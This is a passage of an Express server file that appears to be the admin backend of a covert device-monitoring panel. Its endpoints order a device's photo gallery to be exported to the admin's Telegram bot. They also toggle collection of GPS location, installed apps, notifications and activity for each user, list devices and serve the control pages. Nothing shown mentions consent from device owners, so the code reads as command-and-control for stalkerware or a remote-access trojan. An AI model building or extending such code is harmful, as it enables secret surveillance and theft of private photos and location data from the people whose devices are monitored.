app.post("/api/admin/gallery/export", requireLogin, requireAdmin, async (req, res) => {
  try {
    const { deviceId } = req.body;
    if (!deviceId) return res.status(400).json({ error: "deviceId required" });

    const adminRes = await pool.query(
      "SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1",
      [req.session.userId]
    );
    if (adminRes.rows.length === 0 || !adminRes.rows[0].bot_token || !adminRes.rows[0].chat_id) {
      return res.status(400).json({ error: "Admin Telegram settings not configured." });
    }

    exportRequestFlags.set(deviceId, {
      requested: true,
      botToken: adminRes.rows[0].bot_token,
      chatId: adminRes.rows[0].chat_id
    });

    res.json({ success: true, message: "Export request sent to device." });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Gallery export failed." });
  }
});

// ================= NEW: USER FEATURES & DEVICES =================
app.get("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
  try {
    const uid = req.params.uid;
    const features = userFeaturesData.get(uid) || {
      deviceInfo: true,
      battery: true,
      gps: true,
      installedApps: true,
      activity: true,
      notifications: true,
      sync: true,
      remoteConfig: true
    };
    res.json({ features });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
});

app.post("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (req, res) => {
  try {
    const uid = req.params.uid;
    const { features } = req.body;
    if (!features || typeof features !== 'object') return res.status(400).json({ error: "features object required" });
    const allowedKeys = ['deviceInfo','battery','gps','installedApps','activity','notifications','sync','remoteConfig'];
    for (const key of Object.keys(features)) {
      if (!allowedKeys.includes(key)) return res.status(400).json({ error: `Invalid feature: ${key}` });
    }
    const current = userFeaturesData.get(uid) || {
      deviceInfo: true,
      battery: true,
      gps: true,
      installedApps: true,
      activity: true,
      notifications: true,
      sync: true,
      remoteConfig: true
    };
    userFeaturesData.set(uid, { ...current, ...features });
    res.json({ success: true });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
});

app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req, res) => {
  try {
    const uid = req.params.uid;
    const userRes = await pool.query("SELECT id FROM users WHERE id=$1 OR email=$1", [uid]);
    if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
    const userId = userRes.rows[0].id;
    const devices = await pool.query("SELECT * FROM devices WHERE owner_user_id=$1", [userId]);
    res.json({ devices: devices.rows });
  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices" }); }
});

// ================= PAGES =================
app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
app.get("/control", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
app.get("/admin.html", requireLogin, requireAdmin, (req, res) => res.sendFile(path.join(__dirname, "admin.html")));
app.get("/admin", requireLogin, requireAdmin, (req, res) => res.sendFile(path.join(__dirname, "admin.html")));
app.get("/dashboard.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
app.get("/dashboard", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.post("/api/logout", (req, res) => {
  req.session.destroy(() => { res.clearCookie("connect.sid"); res.json({ message: "Logged out." }); });
});

app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
